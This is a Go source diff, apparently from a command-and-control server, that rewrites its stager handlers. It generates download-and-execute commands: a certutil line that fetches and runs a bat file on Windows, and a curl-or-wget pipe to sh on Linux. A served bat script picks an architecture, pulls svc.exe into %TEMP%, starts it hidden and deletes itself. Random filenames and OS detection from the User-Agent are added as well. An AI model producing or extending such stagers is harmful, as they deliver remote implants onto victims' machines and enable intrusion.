@@ -28,6 +28,7 @@ type StagerConfig struct {
 	Host            string
 	AutoDestruct    bool
 	SleepTime       int
+	Extra           string // For bat stager: "url64|url32"
 }
 
 var upgrader_gen = websocket.Upgrader{
@@ -145,7 +146,7 @@ func HandleGenerate(c *gin.Context) {
 		}
 
 		randSuffix, _ := utils.RandomAlphaString(8)
-		filename := fmt.Sprintf("agent_%s_%s", req.Arch, randSuffix)
+		filename := randSuffix
 		if req.OS == "windows" {
 			filename += ".exe"
 		}
@@ -309,33 +310,41 @@ func HandleGetStager(c *gin.Context) {
 		return
 	}
 
-	id := uuid.New().String()[:8]
-	StagerCache.Store(id, StagerConfig{
-		OS:           osType,
-		Arch:         arch,
-		ListenerID:   listenerID,
-		Host:         host,
-		AutoDestruct: true,
-		SleepTime:    10,
-	})
-
 	serverHost := c.Request.Host
+	if host != "" { serverHost = host }
 	protocol := "http"
 	if c.Request.TLS != nil { protocol = "https" }
-	
-	baseURL := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id)
-	
-	command := ""
-	if osType == "windows" {
-		command = fmt.Sprintf("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; `$f='%s.exe'; (New-Object System.Net.WebClient).DownloadFile('%s', `$f); Start-Process `$f;\"", id, baseURL)
-	} else {
-		command = fmt.Sprintf("curl -sL %s -o %s && chmod +x %s && ./%s &", baseURL, id, id, id)
-	}
 
-	c.JSON(200, gin.H{
-		"id":      id,
-		"command": command,
-	})
+	if osType == "windows" {
+		// Windows: 生成两个 stager ID (x64 + x86)，bat 脚本自动判断架构
+		id64 := uuid.New().String()[:3]
+		id32 := uuid.New().String()[:3]
+		StagerCache.Store(id64, StagerConfig{OS: "windows", Arch: "x64", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
+		StagerCache.Store(id32, StagerConfig{OS: "windows", Arch: "x86", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
+
+		url64 := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id64)
+		url32 := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id32)
+
+		// bat 脚本：自动检测架构，下载对应版本并执行
+		command := fmt.Sprintf("certutil.exe -urlcache -split -f %s C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat", 
+			fmt.Sprintf("%s://%s/api/s/w_%s_%s", protocol, serverHost, id64, id32))
+
+		// 注册一个特殊的 bat stager，内容是架构判断脚本
+		batID := fmt.Sprintf("w_%s_%s", id64, id32)
+		StagerCache.Store(batID, StagerConfig{OS: "windows_bat", Arch: "auto", ListenerID: listenerID, Host: host,
+			AutoDestruct: true, SleepTime: 10,
+			Extra: fmt.Sprintf("%s|%s", url64, url32),
+		})
+
+		c.JSON(200, gin.H{"id": batID, "command": command})
+	} else {
+		// Linux: 单一 stager
+		id := uuid.New().String()[:3]
+		StagerCache.Store(id, StagerConfig{OS: "linux", Arch: arch, ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
+		baseURL := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id)
+		command := fmt.Sprintf("(curl -fsSL -m180 %s||wget -T180 -q %s)|sh", baseURL, baseURL)
+		c.JSON(200, gin.H{"id": id, "command": command})
+	}
 }
 
 func HandleServePayload(c *gin.Context) {
@@ -347,6 +356,41 @@ func HandleServePayload(c *gin.Context) {
 	}
 	conf := val.(StagerConfig)
 
+	// 🚀 Windows BAT stager: returns a script that auto-detects x64/x86
+	if conf.OS == "windows_bat" {
+		parts := strings.Split(conf.Extra, "|")
+		if len(parts) != 2 {
+			c.Data(500, "text/plain", []byte("Invalid bat config"))
+			return
+		}
+		url64 := parts[0]
+		url32 := parts[1]
+
+		bat := fmt.Sprintf(`@echo off
+if "%%PROCESSOR_ARCHITECTURE%%"=="AMD64" (
+    certutil.exe -urlcache -split -f %s %%TEMP%%\svc.exe >nul 2>&1
+) else (
+    certutil.exe -urlcache -split -f %s %%TEMP%%\svc.exe >nul 2>&1
+)
+start /b %%TEMP%%\svc.exe
+del /f /q "%%~f0" >nul 2>&1
+`, url64, url32)
+
+		c.Data(200, "application/octet-stream", []byte(bat))
+		return
+	}
+
+	// 🚀 Auto-detect target OS from User-Agent if set to "auto"
+	targetOS := conf.OS
+	if targetOS == "" || targetOS == "auto" {
+		ua := strings.ToLower(c.Request.UserAgent())
+		if strings.Contains(ua, "windows") || strings.Contains(ua, "win") || strings.Contains(ua, "certutil") {
+			targetOS = "windows"
+		} else {
+			targetOS = "linux"
+		}
+	}
+
 	// Fetch Listener Details
 	lnVal, ok := globals.Listeners.Load(conf.ListenerID)
 	if !ok {
@@ -355,9 +399,9 @@ func HandleServePayload(c *gin.Context) {
 	}
 	ln := lnVal.(*globals.Listener)
 
-	// Prepare template name
-	templateName := "client_template_linux"
-	if conf.OS == "windows" {
+	// Prepare template name based on detected OS and protocol
+	templateName := ""
+	if targetOS == "windows" {
 		switch strings.ToUpper(ln.Protocol) {
 		case "WS":
 			templateName = "client_template_windows.exe"
